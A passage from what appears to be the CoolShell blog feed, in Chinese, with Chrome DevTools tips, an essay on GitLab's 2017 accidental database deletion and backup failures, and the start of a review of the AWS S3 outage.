<p>现在的网页上都会有一些动画效果。在Chrome的开发者工具中，通过右上角的菜单中的 <code>More Tools</code> =&gt; <code>Animations</code> 呼出相关的选项卡。于是你就可以慢动作播放动画了（可以点选 <code>25%</code> 或 <code>10%</code>），然后，Chrome还可以帮你把动画录下来，你可以拉动动再画的过程，甚至可以做一些简单的修改。</p>
<p> </p>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91%E7%BD%91%E9%A1%B5"></span>直接编辑网页<span class="ez-toc-section-end"></span>
</h4>
<p>在你的 console 里 输入下面的命令：</p>
<p><code data-enlighter-language="js" class="EnlighterJSRAW">document.designMode = "on" </code></p>
<p>于是你就可以直接修改网页上的内容了。</p>
<p>P.S. 下面这个抓屏中还演示了一个如何清空console的示例。你可以输入 clear() 或是 按 <code>Ctrl+L</code>（Windows下），<code>CMD + K</code> (Mac下)</p>
<p><img alt="image placeholder" ></p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E7%BD%91%E7%BB%9C%E9%99%90%E9%80%9F"></span>网络限速<span class="ez-toc-section-end"></span>
</h4>
<p>你可以设置你的网络的访问速度来模拟一个网络很慢的情况。</p>
<p><img alt="image placeholder" ></p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%A4%8D%E5%88%B6HTTP%E8%AF%B7%E6%B1%82"></span>复制HTTP请求<span class="ez-toc-section-end"></span>
</h4>
<p>这个是我很喜欢 的一个功能，你可以在 network选项卡里，点击 XHR 过滤相关的Ajax请求，然后在相关的请求上点鼠标右键，在菜单中选择： <code>Copy</code> =&gt; <code>Copy as cURL</code>，然后就可以到你的命令行下去 执行 <code>curl</code> 的命令了。这个可以很容易做一些自动化的测试。</p>
<p><img alt="image placeholder" ></p>
<p> </p>
<p><strong>友情提示：这个操作有可能会把你的个人隐私信息复制出去，比如你个人登录后的cookie。</strong></p>
<h4>
<span class="ez-toc-section" id="%E6%8A%93%E4%B8%AA%E5%B8%A6%E6%89%8B%E6%9C%BA%E7%9A%84%E5%9B%BE"></span>抓个带手机的图<span class="ez-toc-section-end"></span>
</h4>
<p>这个可能有点无聊了，不过我觉得挺有意思的。</p>
<p>在device显示中，先选择一个手机，然后在右上角选 <code>Show Device Frame</code>，然后你就看到手机的样子了，然后再到那个菜中中选 Capture snapshot，就可以抓下一个有手机样子的截图了。</p>
<p><img alt="image placeholder" ></p>
<p>我抓的图如下（当然，不是所有的手机都有frame的）</p>
<p><img alt="image placeholder" ></p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E8%AE%BE%E7%BD%AE%E6%96%AD%E7%82%B9"></span>设置断点<span class="ez-toc-section-end"></span>
</h4>
<p>除了给Javascript的源代码上设置断点调试，你还可以：</p>
<h5>
<span class="ez-toc-section" id="%E7%BB%99DOM%E8%AE%BE%E7%BD%AE%E6%96%AD%E7%82%B9"></span>给DOM设置断点<span class="ez-toc-section-end"></span>
</h5>
<p>选中一个DOM，然后在右键菜单中选 Break on … 你可以看到如下三个选项：</p>
<h4><img alt="image placeholder" ></h4>
<h5>
<span class="ez-toc-section" id="%E7%BB%99XHR%E5%92%8CEvent_Lisener%E8%AE%BE%E7%BD%AE%E6%96%AD%E7%82%B9"></span>给XHR和Event Lisener设置断点<span class="ez-toc-section-end"></span>
</h5>
<p>在 Sources 面页中，你可以看到右边的那堆break points中，除了上面我们说的给DOM设置断点，你还可以给XHR和Event Listener设置断点，载图如下：</p>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8EConsole%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7"></span>关于Console中的技巧<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="DOM%E6%93%8D%E4%BD%9C"></span>DOM操作<span class="ez-toc-section-end"></span>
</h5>
<ul>
<li>chrome会帮你buffer 5个你查看过的DOM对象，你可以直接在Console中用 $0, $1, $2, $3, $4来访问。</li>
</ul>
<ul>
<li>你还可以使用像jQuery那样的语法来获得DOM对象，如：<code>$("#mydiv")</code>
</li>
</ul>
<ul>
<li>你还可使用 <code>$$(".class")</code> 来选择所有满足条件的DOM对象。</li>
</ul>
<ul>
<li>你可以使用 <code>getEventListeners($("selector"))</code> 来查看某个DOM对象上的事件（如下图所示）。</li>
</ul>
<p><img alt="image placeholder" ></p>
<ul>
<li>你还可以使用 <code>monitorEvents($("selector"))</code> 来监控相关的事件。比如：</li>
</ul>
<p><code data-enlighter-language="js" class="EnlighterJSRAW">monitorEvents(document.body, "click");</code></p>
<p><img alt="image placeholder" ></p>
<h5>
<span class="ez-toc-section" id="Console%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0"></span>Console中的一些函数<span class="ez-toc-section-end"></span>
</h5>
<p><strong>1）monitor函数</strong></p>
<p>使用 monitor函数来监控一函数，如下面的示例</p>
<p><img alt="image placeholder" ></p>
<p><strong>2）copy函数</strong></p>
<p>copy函数可以把一个变量的值copy到剪贴板上。</p>
<p><strong>3）inspect函数</strong></p>
<p>inspect函数可以让你控制台跳到你需要查看的对象上。如：</p>
<p><img alt="image placeholder" ></p>
<p>更多的函数请参数官方文档 – <a href="https://developers.google.com/web/tools/chrome-devtools/console/command-line-reference" target="_blank">Using the Console / Command Line Reference</a></p>
<h5>
<span class="ez-toc-section" id="Console%E7%9A%84%E8%BE%93%E5%87%BA"></span>Console的输出<span class="ez-toc-section-end"></span>
</h5>
<p>我们知道，除了<code>console.log</code>之外，还有<code>console.debug</code>，<code>console.info</code>，<code>console.warn</code>，<code>console.error</code>这些不同级别的输出。另外一个鲜为人知的功能是，<code>console.log</code>中，你还可以对输出的文本加上css的样式，如下所示：</p>
<p><code data-enlighter-language="js" class="EnlighterJSRAW">console.log("%c左耳朵", "font-size:90px;color:#888")</code></p>
<p><img alt="image placeholder" ></p>
<p>于是，你可以定义一些相关的log函数，如：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">console.todo = function( msg){
  console.log( '%c%s %s %s', 'font-size:20px; color:yellow; background-color: blue;', '--', msg, '--');
}
console.important = function( msg){
  console.log( '%c%s %s %s', 'font-size:20px; color:brown; font-weight: bold; text-decoration: underline;', '--', msg, '--');
}</pre>
<p><img alt="image placeholder" ></p>
<p>关于console.log中的格式化，你可以参看如下表格：</p>
<table class="t1" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="td1" valign="middle">指示符</td>
<td class="td2" valign="middle">输出</td>
</tr>
<tr>
<td class="td3" valign="top">%s</td>
<td class="td4" valign="top">格式化输出一个字符串变量。</td>
</tr>
<tr>
<td class="td3" valign="top">%i or %d</td>
<td class="td4" valign="top">格式化输出一个整型变量的值。</td>
</tr>
<tr>
<td class="td3" valign="top">%f</td>
<td class="td4" valign="top">格式化输出一个浮点数变量的值。</td>
</tr>
<tr>
<td class="td3" valign="top">%o</td>
<td class="td4" valign="top">格式化输出一个DOM对象。</td>
</tr>
<tr>
<td class="td3" valign="top">%O</td>
<td class="td4" valign="top">格式化输出一个Javascript对象。</td>
</tr>
<tr>
<td class="td3" valign="top">%c</td>
<td class="td4" valign="top">为后面的字符串加上CSS样式</td>
</tr>
</tbody>
</table>
<p> </p>
<p>除了console.log打印js的数组，你还可以使用console.table来打印，如下所示：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var pets = [
  { animal: 'Horse', name: 'Pony', age: 23 },
  { animal: 'Dog', name: 'Snoopy', age: 13 },
  { animal: 'Cat', name: 'Tom', age: 18 },
  { animal: 'Mouse', name: 'Jerry', age: 12}
];
console.table(pets)</pre>
<p><img alt="image placeholder" ></p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8Econsole%E5%AF%B9%E8%B1%A1"></span>关于console对象<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>console对象除了上面的打日志的功能，其还有很多功能，比如：</li>
<li>console.trace() 可以打出js的函数调用栈</li>
<li>console.time() 和 console.timeEnd() 可以帮你计算一段代码间消耗的时间。</li>
<li>console.profile() 和 console.profileEnd() 可以让你查看CPU的消耗。</li>
<li>console.count() 可以让你看到相同的日志当前被打印的次数。</li>
<li>console.assert(expression, object) 可以让你assert一个表达式</li>
</ul>
<p>这些东西都可以看看<a href="https://developers.google.com/web/tools/chrome-devtools/console/console-reference" target="_blank">Google的Console API的文档</a>。</p>
<p>其实，还有很多东西，你可以参看Google的官方文档 – <a href="https://developers.google.com/web/tools/chrome-devtools/" target="_blank">Chrome DevTools</a></p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8E%E5%BF%AB%E6%8D%B7%E9%94%AE"></span>关于快捷键<span class="ez-toc-section-end"></span>
</h4>
<p>点击在 DevTools的右上角的那三个坚排的小点，你会看到一个菜单，点选 <code>Shortcuts</code>，你就可以看到所有的快捷键了</p>
<p><img alt="image placeholder" ></p>
<p>如果你知道更多，也欢迎补充！</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-01-19T20:25:55+08:00</pubDate>
<guid>https://coolshell.cn/articles/17634.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 从Gitlab误删除数据库想到的 ]]></title>
<link>https://coolshell.cn/articles/17680.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >昨天，Gitlab.com发生了一个大事，某同学误删了数据库，这个事看似是个低级错误，不过，因为Gitlab把整个过程的细节都全部暴露出来了，所以，可以看到很多东西，而对于类似这样的事情，我自己以前也干过，而在最近的两公司中我也见过（Amazon中见过一次，阿里中见过至少四次），正好通过这个事来说说一下自己的一些感想和观点吧。<strong>我先放个观点：你觉得有备份系统就不会丢数据了吗？</strong></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BA%8B%E4%BB%B6%E5%9B%9E%E9%A1%BE" title="事件回顾">事件回顾</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E6%80%9D%E8%80%83" title="相关的思考">相关的思考</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%8A%80%E6%9C%AF%E6%96%B9%E9%9D%A2" title="技术方面">技术方面</a></li></ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-4" href="#%E5%85%B3%E4%BA%8E%E5%A4%87%E4%BB%BD" title="关于备份">关于备份</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#%E9%9D%9E%E6%8A%80%E6%9C%AF%E6%96%B9%E9%9D%A2" title="非技术方面">非技术方面</a></li></ul>
</li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BA%8B%E4%BB%B6%E5%9B%9E%E9%A1%BE"></span>事件回顾<span class="ez-toc-section-end"></span>
</h4>
<p>整个事件的回顾Gitlab.com在第一时间就放到了<a href="https://docs.google.com/document/d/1GCK53YDcBWQveod9kfzW-VCxIABGiryG7_z_6jHdVik/pub" target="_blank">Google Doc上</a>，事后，又发了<a href="https://about.gitlab.com/2017/02/01/gitlab-dot-com-database-incident/" target="_blank">一篇Blog</a>来说明这个事，在这里，我简单的回顾一下这个事件的过程。</p>
<p>首先，一个叫YP的同学在给gitlab的线上数据库做一些负载均衡的工作，在做这个工作时的时候突发了一个情况，Gitlab被DDoS攻击，数据库的使用飙高，在block完攻击者的IP后，发现有个staging的数据库(db2.staging)已经落后生产库4GB的数据，于是YP同学在Fix这个staging库的同步问题的时候，发现db2.staging有各种问题都和主库无法同步，在这个时候，YP同学已经工作的很晚了，在尝试过多个方法后，发现db2.staging都hang在那里，无法同步，于是他想把db2.staging的数据库删除了，这样全新启动一个新的复制，结果呢，删除数据库的命令错误的敲在了生产环境上（db1.cluster），结果导致整个生产数据库被误删除。（<strong>陈皓注：这个失败基本上就是 “工作时间过长” + “在多数终端窗口中切换中迷失掉了”</strong>）</p>
<p><span id="more-17680"></span></p>
<p>在恢复的过程中，他们发现只有db1.staging的数据库可以用于恢复，而其它的5种备份机制都不可用，第一个是数据库的同步，没有同步webhook，第二个是对硬盘的快照，没有对数据库做，第三个是用pg_dump的备份，发现版本不对（用9.2的版本去dump 9.6的数据）导致没有dump出数据，第四个S3的备份，完全没有备份上，第五个是相关的备份流程是问题百出的，只有几个粗糙的人肉的脚本和糟糕的文档，也就是说，不但是是人肉的，而且还是完全不可执行的。（<strong>陈皓注：就算是这些备份机制都work，其实也有问题，因为这些备份大多数基本上都是24小时干一次，所以，要从这些备份恢复也一定是是要丢数据的了，只有第一个数据库同步才会实时一些</strong>）</p>
<p>最终，gitlab从db1.staging上把6个小时前的数据copy回来，结果发现速度非常的慢，备份结点只有60Mbits/S，拷了很长时间（<strong>陈皓注：为什么不把db1.staging给直接变成生产机？因为那台机器的性能很差</strong>）。数据现在的恢复了，不过，因为恢复的数据是6小时前的，所以，有如下的数据丢失掉了：</p>
<ul class="ul1">
<li class="li1"><span class="s2">粗略估计，有4613 的项目， 74 forks,  和 350 imports 丢失了；但是，因为Git仓库还在，所以，可以从Git仓库反向推导数据库中的数据，但是，项目中的issues等就完全丢失了。</span></li>
<li class="li1"><span class="s2">大约有±4979 提交记录丢失了（陈皓注：估计也可以用git仓库中反向恢复）。</span></li>
<li class="li1"><span class="s2">可能有 707  用户丢失了，这个数据来自Kibana的日志。</span></li>
<li class="li2"><span class="s4">在1月31日17:20 后的Webhooks 丢失了。</span></li>
</ul>
<p>因为Gitlab把整个事件的细节公开了出来，所以，也得到了很多外部的帮助，2nd Quadrant的CTO – <span class="s1"><a href="https://www.linkedin.com/in/simonat2ndquadrantdotcom" target="_blank">Simon Riggs</a> 在他的blog上也发布文章 <a href="http://blog.2ndquadrant.com/dataloss-at-gitlab/" target="_blank">Dataloss at Gitlab </a>给了一些非常不错的建议：</span></p>
<ul>
<li>关于PostgreSQL 9.6的数据同步hang住的问题，可能有一些Bug，正在fix中。</li>
<li>PostgreSQL有4GB的同步滞后是正常的，这不是什么问题。</li>
<li>正常的停止从结点，会让主结点自动释放WALSender的链接数，所以，不应该重新配置主结点的 max_wal_senders 参数。但是，停止从结点时，主结点的复数连接数不会很快的被释放，而新启动的从结点又会消耗更多的链接数。他认为，Gitlab配置的32个链接数太高了，通常来说，2到4个就足够了。</li>
<li>另外，之前gitlab配置的max_connections=8000太高了，现在降到2000个是合理的。</li>
<li>pg_basebackup 会先在主结点上建一个checkpoint，然后再开始同步，这个过程大约需要4分钟。</li>
<li>手动的删除数据库目录是非常危险的操作，这个事应该交给程序来做。推荐使用刚release 的 <a href="https://www.2ndquadrant.com/en/resources/repmgr/" target="_blank">repmgr</a>
</li>
<li>恢复备份也是非常重要的，所以，也应该用相应的程序来做。推荐使用 <a href="https://www.2ndquadrant.com/en/resources/barman/" target="_blank">barman</a> （其支持S3）</li>
<li>测试备份和恢复是一个很重要的过程。</li>
</ul>
<p>看这个样子，估计也有一定的原因是——Gitlab的同学对PostgreSQL不是很熟悉。</p>
<p>随后，Gitlab在其网站上也开了一系列的issues，其issues列表在这里 <a href="https://gitlab.com/gitlab-com/www-gitlab-com/issues/1108" target="_blank">Write post-mortem</a> (这个列表可能还会在不断更新中)</p>
<ul class="ul1">
<li class="li1"><span class="s1"><span class="s2"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1094">infrastructure#1094</a> – Update PS1 across all hosts to more clearly differentiate between hosts and environments</span></span></li>
<li class="li1"><span class="s3"><span class="s4"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1095">infrastructure#1095</a> – Prometheus monitoring for backups</span></span></li>
<li class="li1"><span class="s3"><span class="s4"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1096">infrastructure#1096</a> – Set PostgreSQL’s max_connections to a sane value</span></span></li>
<li class="li1"><span class="s3"><span class="s4"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1097">infrastructure#1097</a> – Investigate Point in time recovery &amp; continuous archiving for PostgreSQL</span></span></li>
<li class="li1"><span class="s3"><span class="s4"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1098">infrastructure#1098</a> – Hourly LVM snapshots of the production databases</span></span></li>
<li class="li1"><span class="s3"><span class="s4"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1099">infrastructure#1099</a> – Azure disk snapshots of production databases</span></span></li>
<li class="li1"><span class="s3"><span class="s4"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1100">infrastructure#1100</a> – Move staging to the ARM environment</span></span></li>
<li class="li1"><span class="s3"><span class="s4"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1101">infrastructure#1101</a> – Recover production replica(s)</span></span></li>
<li class="li1"><span class="s3"><span class="s4"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1102">infrastructure#1102</a> – Automated testing of recovering PostgreSQL database backups</span></span></li>
<li class="li1"><span class="s3"><span class="s4"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1103">infrastructure#1103</a> – Improve PostgreSQL replication documentation/runbooks</span></span></li>
<li class="li1"><span class="s3"><span class="s4"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1104">infrastructure#1104</a> – Kick out SSH users inactive for N minutes</span></span></li>
<li class="li2"><span class="s5"><span class="s4"><a href="https://gitlab.com/gitlab-com/infrastructure/issues/1105">infrastructure#1105</a> – Investigate pgbarman for creating PostgreSQL backups</span></span></li>
</ul>
<p>从上面的这个列表中，我们可以看到一些改进措施了。挺好的，不过我觉得还不是很够。</p>
<h4>
<span class="ez-toc-section" id="%E7%9B%B8%E5%85%B3%E7%9A%84%E6%80%9D%E8%80%83"></span>相关的思考<span class="ez-toc-section-end"></span>
</h4>
<p>因为类似这样的事，我以前也干过（误删除过数据库，在多个终端窗口中迷失掉了自己所操作的机器……），而且我在amazon里也见过一次，在阿里内至少见过四次以上（在阿里人肉运维的误操作的事故是我见过最多的），但是我无法在这里公开分享，私下可以分享。在这里，我只想从非技术和技术两个方面分享一下我的经验和认识。</p>
<h5>
<span class="ez-toc-section" id="%E6%8A%80%E6%9C%AF%E6%96%B9%E9%9D%A2"></span>技术方面<span class="ez-toc-section-end"></span>
</h5>
<p><strong>人肉运维</strong></p>
<p>一直以来，我都觉得直接到生产线上敲命令是一种非常不好的习惯。我认为，<strong>一个公司的运维能力的强弱和你上线上环境敲命令是有关的，你越是喜欢上线敲命令你的运维能力就越弱，越是通过自动化来处理问题，你的运维能力就越强</strong>。理由如下：</p>
<p style="padding-left: 30px;">其一，如果说对代码的改动都是一次发布的话，那么，对生产环境的任何改动（包括硬件、操作系统、网络、软件配置……），也都算是一次发布。那么这样的发布就应该走发布系统和发布流程，要被很好的测试、上线和回滚计划。关键是，走发布过程是可以被记录、追踪和回溯的，而在线上敲命令是完全无法追踪的。没人知道你敲了什么命令。</p>
<p style="padding-left: 30px;">其二，真正良性的运维能力是——人管代码，代码管机器，而不是人管机器。你敲了什么命令没人知道，但是你写个工具做变更线上系统，这个工具干了什么事，看看工具的源码就知道了。</p>
<p>另外、有人说，以后不要用rm了，要用mv，还有人说，以后干这样的事时，一个人干，另一个人在旁边看，还有人说，要有一个checklist的强制流程做线上的变更，还有人说要增加一个权限系统。我觉得，这些虽然可以work，但是依然不好，再由如下：</p>
<p style="padding-left: 30px;">其一、如果要解决一个事情需要加更多的人来做的事，那这事就做成劳动密集型了。今天我们的科技就是在努力消除人力成本，而不是在增加人力成本。而做为一个技术人员，解决问题的最好方式是努力使用技术手段，而不是使用更多的人肉手段。<strong>人类区别于动物的差别就是会发明和使用现代化的工具，而不是使用更多的人力</strong>。另外，<strong>这不仅仅因为是，人都是会有这样或那样的问题（疲惫、情绪化、急燥、冲动……），而机器是单一无脑不知疲惫的，更是因为，机器干活的效率和速度是比人肉高出N多倍的</strong>。</p>
<p style="padding-left: 30px;">其二、增加一个权限系统或是别的一个watch dog的系统完全是在开倒车，权限系统中的权限谁来维护和审批？不仅仅是因为多出来的系统需要多出来的维护，关键是这个事就没有把问题解决在root上。除了为社会解决就业问题，别无好处，故障依然会发生，有权限的人一样会误操作。对于Gitlab这个问题，正如2nd Quadrant的CTO建议的那样，你需要的是一个自动化的备份和恢复的工具，而不是一个权限系统。</p>
<p style="padding-left: 30px;">其三、像使用mv而不rm，搞一个checklist和一个更重的流程，更糟糕。这里的逻辑很简单，因为，1）这些规则需要人去学习和记忆，本质上来说，你本来就不相信人，所以你搞出了一些规则和流程，而这些规则和流程的执行，又依赖于人，换汤不换药，2）另外，<strong>写在纸面上的东西都是不可执行的，可以执行的就是只有程序，所以，为什么不把checklist和流程写成代码呢</strong>？（你可能会说程序也会犯错，是的，程序的错误是consistent，而人的错误是inconsistent）</p>
<p>最关键的是，<strong>数据丢失有各种各样的情况，不单单只是人员的误操作，比如，掉电、磁盘损坏、中病毒等等，在这些情况下，你设计的那些想流程、规则、人肉检查、权限系统、checklist等等统统都不管用了，这个时候，你觉得应该怎么做呢？是的，你会发现，你不得不用更好的技术去设计出一个高可用的系统！别无它法。</strong></p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8E%E5%A4%87%E4%BB%BD"></span>关于备份<span class="ez-toc-section-end"></span>
</h4>
<p>一个系统是需要做数据备份的，但是，你会发现，<strong>Gitlab这个事中，就算所有的备份都可用，也不可避免地会有数据的丢失，或是也会有很多问题</strong>。理由如下：</p>
<p style="padding-left: 30px;">1）备份通常来说都是周期性的，所以，如果你的数据丢失了，从你最近的备份恢复数据里，从备份时间到故障时间的数据都丢失了。</p>
<p style="padding-left: 30px;">2）备份的数据会有版本不兼容的问题。比如，在你上次备份数据到故障期间，你对数据的scheme做了一次改动，或是你对数据做了一些调整，那么，你备份的数据就会和你线上的程序出现不兼容的情况。</p>
<p style="padding-left: 30px;">3）有一些公司或是银行有灾备的数据中心，但是灾备的数据中心没有一天live过。等真正灾难来临需要live的时候，你就会发现，各种问题让你live不起来。你可以读一读几年前的这篇报道好好感受一下《<a href="http://finance.sina.com.cn/money/bank/20140804/091219903553.shtml" target="_blank">以史为鉴 宁夏银行7月系统瘫痪最新解析</a>》</p>
<p>所以，在灾难来临的时候，你会发现你所设计精良的“备份系统”或是“灾备系统”就算是平时可以工作，但也会导致数据丢失，而且可能长期不用的备份系统很难恢复（比如应用、工具、数据的版本不兼容等问题）。</p>
<p>我之前写过一篇《<a href="https://coolshell.cn/articles/10910.html" target="_blank">分布式系统的事务处理</a>》，你还记得下面这张图吗？看看 Data Loss 那一行的，在Backups, Master/Slave 和 Master/Master的架构下，都是会丢的。</p>
<p><img alt="image placeholder" ></p>
<p>所以说，<strong>如果你要让你的备份系统随时都可以用，那么你就要让它随时都Live着</strong>，而随时都Live着的多结点系统，基本上就是一个分布式的高可用的系统。因为<strong>，数据丢失的原因有很多种，比如掉电、磁盘损坏、中病毒等等，而那些流程、规则、人肉检查、权限系统、checklist等等都只是让人不要误操作，都不管用，这个时候，你不得不用更好的技术去设计出一个高可用的系统！别无它法。（重要的事，得再说一篇）</strong></p>
<p>另外，你可以参看我的另一篇《<a href="https://coolshell.cn/articles/17459.html" target="_blank">关于高可用系统</a>》，这篇文章中以MySQL为例，数据库的replication也只能达到 两个9。</p>
<p><strong>AWS 的 S3 的的高可用是4个加11个9的持久性（</strong>所谓11个9的持久性durability，AWS是这样定义的，如果你存了1万个对象，那么丢一个的时间是1000万年<strong>），这意味着，不仅仅只是硬盘坏，机器掉电，整个机房挂了，其保证可以承受有两个设施的数据丢失，数据还是可用的。试想，如果你把数据的可用性通过技术做到了这个份上，那么，你还怕被人误删一个结点上的数据吗？</strong></p>
<h5>
<span class="ez-toc-section" id="%E9%9D%9E%E6%8A%80%E6%9C%AF%E6%96%B9%E9%9D%A2"></span>非技术方面<span class="ez-toc-section-end"></span>
</h5>
<p><strong>故障反思</strong></p>
<p>一般说来，故障都需要反思，在Amazon，S2以上的故障都需要写COE（Correction of Errors），其中一节就是需要Ask 5 Whys，我发现在Gitlab的故障回顾的blog中第一段中也有说要在今天写个Ask 5 Whys。关于Ask 5 Whys，其实并不是亚马逊的玩法，这还是算一个业内常用的玩法，也就是说不断的为自己为为什么，直到找到问题的概本原因，这会逼着所有的当事人去学习和深究很多东西。在Wikipedia上有相关的词条 <a href="https://en.wikipedia.org/wiki/5_Whys" target="_blank">5 Whys</a>，其中罗列了14条规则：</p>
<ol>
<li>你需要找到正确的团队来完成这个故障反思。</li>
<li>使用纸或白板而不是电脑。</li>
<li>写下整个问题的过程，确保每个人都能看懂。</li>
<li>区别原因和症状。</li>
<li>特别注意因果关系。</li>
<li>说明Root Cause以及相关的证据。</li>
<li>5个为什么的答案需要是精确的。</li>
<li>寻找问题根源的步骤，而不是直接跳到结论。</li>
<li>要基础客观的事实、数据和知识。</li>
<li>评估过程而不是人。</li>
<li>千万不要把“人为失误”或是“工作不注意”当成问题的根源。</li>
<li>培养信任和真诚的气氛和文化。</li>
<li>不断的问“为什么”直到问题的根源被找到。这样可以保证同一个坑不会掉进去两次。<sup id="cite_ref-7" class="reference"></sup>
</li>
<li>当你给出“为什么”的答案时，你应该从用户的角度来回答。</li>
</ol>
<p><strong>工程师文化</strong></p>
<p>上述的这些观点，其实，我在我的以住的博客中都讲过很多遍了，你可以参看《<a href="https://coolshell.cn/articles/17497.html" target="_blank">什么是工程师文化？</a>》以及《<a href="https://coolshell.cn/articles/11656.html" target="_blank">开发团队的效率</a>》。其实，说白了就是这么一个事——<strong>如果你是一个技术公司，你就会更多的相信技术而不是管理。相信技术会用技术来解决问题，相信管理，那就只会有制度、流程和价值观来解决问题</strong>。</p>
<p>这个道理很简单，<strong>数据丢失有各种各样的情况，不单单只是人员的误操作，比如，掉电、磁盘损坏、中病毒等等，在这些情况下，你设计的那些流程、规则、人肉检查、权限系统、checklist等等统统都不管用，这个时候，你觉得应该怎么做呢？是的，你会发现，你不得不用更好的技术去设计出一个高可用的系统！别无它法。（重要的事得说三遍）</strong></p>
<p><strong>事件公开</strong></p>
<p>很多公司基本上都是这样的套路，首先是极力掩盖，如果掩盖不了了就开始撒谎，撒不了谎了，就“文过饰非”、“避重就轻”、“转移视线”。然而，面对危机的最佳方法就是——“多一些真诚，少一些套路”，<strong>所谓的“多一些真诚”的最佳实践就是——“透明公开所有的信息”</strong>，Gitlab此次的这个事给大家树立了非常好的榜样。AWS也会把自己所有的故障和细节都批露出来。</p>
<p><strong>事情本来就做错了，而公开所有的细节，会让大众少很多猜测的空间，有利于抵制流言和黑公关，同时，还会赢得大众的理解和支持</strong>。看看Gitlab这次还去YouTube上直播整个修复过程，是件很了不起的事，大家可以到他们的blog上看看，对于这样的透明和公开，一片好评。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-02-02T16:11:28+08:00</pubDate>
<guid>https://coolshell.cn/articles/17680.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ AWS 的 S3 故障回顾和思考 ]]></title>
<link>https://coolshell.cn/articles/17737.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >继<a href="https://coolshell.cn/articles/17680.html" target="_blank">Gitlab的误删除数据事件</a>没几天，“不沉航母” AWS S3 （Simple Storage Service）几天前也“沉”了4个小时，墙外的半个互联网也跟着挂了。如约，按 AWS 惯例，AWS今天给出了一个简单的故障报告《<span class="s1"><a href="https://aws.amazon.com/cn/message/41926/" target="_blank">Summary of the Amazon S3 Service Disruption in the Northern Virginia (US-EAST-1) Region</a>》。这个故障和简单来说和Gitlab一样，也是人员误操作。先简单的说一下这份报中说了什么。</span></p>
<h4>故障原因</h4>
<p>简单来说，这天，有一个 AWS 工程师在调查 <span class="s1">Northern Virginia (US-EAST-1) Region 上 S3 的一个和账务系统相关的问题，这个问题是S3的账务系统变慢了（我估计这个故障在Amazon里可能是Sev2级，Sev2级的故障在Amazon算是比较大的故障，需要很快解决），Oncall的开发工程师（注：Amazon的运维都是由开发工程师来干的，所以Amazon内部嬉称SDE-Software Developer Engineer 为 Someone Do Everything）想移除一个账务系统里的一个子系统下的一些少量的服务器（估计这些服务器上有问题，所以想移掉后重新部署），结果呢，有一条命令搞错了，导致了移除了大量的S3的控制系统。包括两个很重要的子系统：</span></p>
<p><span id="more-17737"></span></p>
<p style="padding-left: 30px;">1）<strong>一个是S3的对象索引服务（Index）</strong>，其中存储了S3对象的metadata和位置信息。这个服务也提供了所有的 GET，LIST，PUT 和DELETE请求。</p>
<p style="padding-left: 30px;">2）<strong>一个是S3的位置服务系统（Placement）</strong>，这个服务提供对象的存储位置和索引服务的系统。这个系统主要是用于处理PUT新对象请求。</p>
<p>这就是为什么S3不可访问的原因。</p>
<p>在后面，AWS也说明了一下故障恢复的过程，其中重点提到了这点——</p>
